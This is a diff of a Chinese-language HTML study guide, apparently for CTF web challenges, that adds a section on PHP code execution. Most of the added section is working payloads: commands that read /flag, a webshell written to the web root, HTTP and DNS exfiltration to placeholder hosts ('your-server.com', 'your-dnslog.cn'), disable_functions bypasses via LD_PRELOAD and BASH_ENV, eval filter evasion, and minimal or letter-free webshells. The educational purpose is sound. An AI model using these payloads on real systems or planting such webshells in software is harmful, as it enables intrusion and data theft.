+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#e6db74">`cat /flag`</span>;              <span style="color:#75715e">// 反引号在PHP中也是shell_exec
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">passthru</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 4. 查看当前路径
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span> <span style="color:#66d9ef">__DIR__</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">getcwd</span>();
+</span></span></code></pre></div>
+<h4 id="进阶利用" data-numberify>进阶利用<a class="anchor ms-1" href="#进阶利用"></a></h4>
+
+<h5 id="无回显" data-numberify>无回显<a class="anchor ms-1" href="#无回显"></a></h5>
+<p><strong>场景</strong>：代码执行了，但页面<strong>没有任何输出</strong>（比如 <code>eval($_GET[1])</code> 把结果丢弃了）。</p>
+<p><strong>解法一：写入文件（Webshell）</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>, <span style="color:#e6db74">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span>);
+</span></span></code></pre></div><p><strong>解法二：HTTP外带</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;http://your-server.com/?&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>)));
+</span></span></code></pre></div><p><strong>解法三：DNSLog外带（PHP）</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;nslookup &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;cat /flag | base64&#39;</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.your-dnslog.cn&#39;</span>);
+</span></span></code></pre></div><p><strong>解法四：时间盲注</strong>（如果PHP函数被禁用一堆，但还能执行 <code>sleep</code>）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;f&#39;</span>) { <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">5</span>); }
+</span></span></code></pre></div>
+<h5 id="disable_functions-绕过php高级考点" data-numberify>disable_functions 绕过（PHP高级考点）<a class="anchor ms-1" href="#disable_functions-绕过php高级考点"></a></h5>
+<p>CTF中PHP常禁用高危函数（<code>system</code>、<code>exec</code>、<code>passthru</code>、<code>shell_exec</code> 等），但这<strong>不代表不能执行系统命令</strong>。</p>
+<p><strong>绕过方法一览</strong>：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">方法</th>
+          <th style="text-align: left">原理</th>
+          <th style="text-align: left">示例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>命令执行函数黑名单绕过</strong></td>
+          <td style="text-align: left">用没禁用的函数</td>
+          <td style="text-align: left"><code>array_map('system', ['cat /flag'])</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>LD_PRELOAD劫持</strong></td>
+          <td style="text-align: left">利用环境变量加载恶意so</td>
+          <td style="text-align: left"><code>putenv(&quot;LD_PRELOAD=/tmp/shell.so&quot;); mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;)</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>PHP-FPM未授权</strong></td>
+          <td style="text-align: left">通过FCGI协议执行任意PHP代码</td>
+          <td style="text-align: left">利用Gopher协议打PHP-FPM</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>ImageMagick漏洞</strong></td>
+          <td style="text-align: left">利用Imagick组件</td>
+          <td style="text-align: left">上传恶意图片触发</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>环境变量提权</strong></td>
+          <td style="text-align: left">利用 <code>BASH_ENV</code> / <code>ENV</code></td>
+          <td style="text-align: left"><code>putenv(&quot;BASH_ENV=/tmp/evil.sh&quot;); system('bash')</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>GC回收机制</strong></td>
+          <td style="text-align: left">利用 <code>php://filter</code> + 反序列化</td>
+          <td style="text-align: left">较复杂，此处不展开</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>CTF中最高频</strong>：<code>LD_PRELOAD</code> + <code>mail()</code> / <code>error_log()</code>（触发子进程加载恶意so）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 简化版（完整EXP较长，推荐直接使用工具：bypass_disablefunc）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD=/tmp/bypass.so&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag&#34;</span>);  <span style="color:#75715e">// 现在system就能用了
+</span></span></span></code></pre></div>
+<h5 id="危险函数变种过滤绕过" data-numberify>危险函数变种（过滤绕过）<a class="anchor ms-1" href="#危险函数变种过滤绕过"></a></h5>
+<p><strong>场景</strong>：<code>eval</code> 被过滤了，但题目还用了其他危险函数。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 原题：eval($_GET[1]);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果 eval 被正则过滤了
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">assert</span>($_GET[<span style="color:#ae81ff">1</span>]);  <span style="color:#75715e">// assert 能替代 eval（PHP 7 以下）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果 assert 也被过滤了
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">call_user_func</span>(<span style="color:#e6db74">&#39;assert&#39;</span>, $_GET[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果所有函数名都被过滤（用数组回调）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">array_map</span>(<span style="color:#e6db74">&#39;assert&#39;</span>, [$_GET[<span style="color:#ae81ff">1</span>]]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果函数名是字符串拼接构造
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span>$a<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eval&#39;</span>; $a($_GET[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果执行点包含在字符串中（动态函数名）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#e6db74">&#39;_GET&#39;</span>}[<span style="color:#e6db74">&#39;1&#39;</span>]();   <span style="color:#75715e">// 等价于 $_GET[1]()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span>$_GET[<span style="color:#ae81ff">1</span>]($_GET[<span style="color:#ae81ff">2</span>]); <span style="color:#75715e">// 传参 ?1=system&amp;2=ls
+</span></span></span></code></pre></div>
+<h5 id="绕过长度限制代码执行版" data-numberify>绕过长度限制（代码执行版）<a class="anchor ms-1" href="#绕过长度限制代码执行版"></a></h5>
+<p><strong>场景</strong>：输入长度被限制（如只能输入10个字符），但内容是PHP代码。</p>
+<p><strong>解法：<code>&lt;?= eval($_POST[1]);</code></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 输入最小webshell（PHP短标签）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=&lt;?=</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 只有19个字符，如果限制更严...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 更短（7个字符）：利用反引号
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#e6db74">`$_GET[1]`</span>;   <span style="color:#75715e">// 但需要传 ?1=ls
+</span></span></span></code></pre></div><p><strong>经典超短Payload（HITCON级别）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span><span style="color:#e6db74">`$_GET[1]`</span>;     <span style="color:#75715e">// 12字符，执行任意系统命令
+</span></span></span></code></pre></div>
+<h5 id="无字母数字的代码执行极限ctf题" data-numberify>无字母数字的代码执行（极限CTF题）<a class="anchor ms-1" href="#无字母数字的代码执行极限ctf题"></a></h5>
+<p><strong>场景</strong>：WAF过滤了所有字母和数字，只能传<strong>符号</strong>。</p>
+<p><strong>核心思路</strong>：利用PHP的<strong>取反<code>~</code></strong>、<strong>异或<code>^</code></strong>、<strong>自增<code>++</code></strong> 构造字符串。</p>
+<p><strong>经典Payload（无字母数字webshell）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 利用 ~ 取反构造 phpinfo()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_<span style="color:#f92672">=~%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">F</span><span style="color:#f92672">%</span><span style="color:#ae81ff">97</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">F</span><span style="color:#f92672">%</span><span style="color:#ae81ff">96</span><span style="color:#f92672">%</span><span style="color:#ae81ff">91</span><span style="color:#f92672">%</span><span style="color:#ae81ff">99</span><span style="color:#f92672">%</span><span style="color:#ae81ff">90</span>;    <span style="color:#75715e">// 取反后得到 phpinfo
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 更通用的Payload（异或构造任意函数）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_<span style="color:#f92672">=</span>(<span style="color:#a6e22e">_</span><span style="color:#f92672">/</span><span style="color:#a6e22e">_</span><span style="color:#f92672">.</span><span style="color:#a6e22e">_</span>)[<span style="color:#a6e22e">_</span>];   <span style="color:#75715e">// 通过数组下标取字符，拼接成函数名
+</span></span></span></code></pre></div><p><strong>深度讲解</strong>（出现概率不高）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 1. 利用自增构造字母（从 &#39;A&#39; 开始）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_<span style="color:#f92672">=</span>[];       <span style="color:#75715e">// 数组
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">=</span>$_[<span style="color:#ae81ff">0</span>];   <span style="color:#75715e">// 未定义，但自增后变成字符串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">++</span>$__;       <span style="color:#75715e">// &#39;a&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">++</span>$__;       <span style="color:#75715e">// &#39;b&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ... 可以构造任意小写字母
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 2. 利用异或构造字符串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;@&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;#&#39;</span>);  <span style="color:#75715e">// 逐字符异或，可拼出任意函数名
+</span></span></span></code></pre></div>
+<h3 id="模板注入-ssti" data-numberify>模板注入 (SSTI)：<a class="anchor ms-1" href="#模板注入-ssti"></a></h3>
 <ul>
 <li>Python (Jinja2, Flask), PHP (Smarty), Java (Thymeleaf)。</li>
 <li>利用链构造与沙箱逃逸。</li>
 </ul>
-</li>
-</ul>
 
 <h2 id="第四章核心漏洞---文件操作篇-file-operations" data-numberify>第四章：核心漏洞 - 文件操作篇 (File Operations)<a class="anchor ms-1" href="#第四章核心漏洞---文件操作篇-file-operations"></a></h2>
-<ol>
-<li>文件包含 (LFI/RFI)：
+
+<h3 id="文件包含-lfirfi" data-numberify>文件包含 (LFI/RFI)：<a class="anchor ms-1" href="#文件包含-lfirfi"></a></h3>
 <ul>
 <li>PHP 伪协议 (<code>php://filter</code>, <code>php://input</code>, <code>zip://</code>, <code>phar://</code>)。</li>
 <li>日志包含 GetShell。</li>
 </ul>
-</li>
-<li>文件上传 (File Upload)：
+
+<h3 id="文件上传-file-upload" data-numberify>文件上传 (File Upload)：<a class="anchor ms-1" href="#文件上传-file-upload"></a></h3>
 <ul>
 <li>前端检测绕过。</li>
 <li>MIME 类型、文件头检测绕过。</li>
@@ -689,8 +1251,6 @@ Disallow: /hidden/flag.txt
 <li>竞争条件 (Race Condition) 上传。</li>
 <li>解析漏洞 (Apache/Nginx/IIS 特性)。</li>
 </ul>
-</li>
-</ol>
 
 <h2 id="第五章客户端与认证安全-client-side--auth" data-numberify>第五章：客户端与认证安全 (Client-side & Auth)<a class="anchor ms-1" href="#第五章客户端与认证安全-client-side--auth"></a></h2>
 <ol>
@@ -1239,10 +1799,43 @@ Disallow: /hidden/flag.txt
             </li>
           </ul>
         </li>
-        <li><a href="#命令执行-rcecommand-injection">命令执行 (RCE/Command Injection)：</a></li>
+        <li><a href="#命令执行-rcecommand-injection">命令执行 (RCE/Command Injection)：</a>
+          <ul>
+            <li><a href="#1原理">1.原理</a></li>
+            <li><a href="#2常见触发函数">2.常见触发函数</a></li>
+            <li><a href="#3无回显-rce">3.无回显 RCE</a>
+              <ul>
+                <li><a href="#dns外带">DNS外带</a></li>
+                <li><a href="#http外带">HTTP外带</a></li>
+              </ul>
+            </li>
+            <li><a href="#4字符限制绕过">4.字符限制绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#代码执行-code-execution">代码执行 (Code Execution)：</a>
+          <ul>
+            <li><a href="#常见触发函数">常见触发函数</a></li>
+            <li><a href="#基础利用有回显">基础利用（有回显）</a></li>
+            <li><a href="#进阶利用">进阶利用</a>
+              <ul>
+                <li><a href="#无回显">无回显</a></li>
+                <li><a href="#disable_functions-绕过php高级考点">disable_functions 绕过（PHP高级考点）</a></li>
+                <li><a href="#危险函数变种过滤绕过">危险函数变种（过滤绕过）</a></li>
+                <li><a href="#绕过长度限制代码执行版">绕过长度限制（代码执行版）</a></li>
+                <li><a href="#无字母数字的代码执行极限ctf题">无字母数字的代码执行（极限CTF题）</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#模板注入-ssti">模板注入 (SSTI)：</a></li>
       </ul>
     </li>
-    <li><a href="#第四章核心漏洞---文件操作篇-file-operations">第四章：核心漏洞 - 文件操作篇 (File Operations)</a></li>
+    <li><a href="#第四章核心漏洞---文件操作篇-file-operations">第四章：核心漏洞 - 文件操作篇 (File Operations)</a>
+      <ul>
+        <li><a href="#文件包含-lfirfi">文件包含 (LFI/RFI)：</a></li>
+        <li><a href="#文件上传-file-upload">文件上传 (File Upload)：</a></li>
+      </ul>
+    </li>
     <li><a href="#第五章客户端与认证安全-client-side--auth">第五章：客户端与认证安全 (Client-side &amp; Auth)</a></li>
     <li><a href="#第六章语言特性与反序列化-language-specifics">第六章：语言特性与反序列化 (Language Specifics)</a></li>
     <li><a href="#第七章高阶技巧与新趋势-advanced--modern-web">第七章：高阶技巧与新趋势 (Advanced &amp; Modern Web)</a></li>
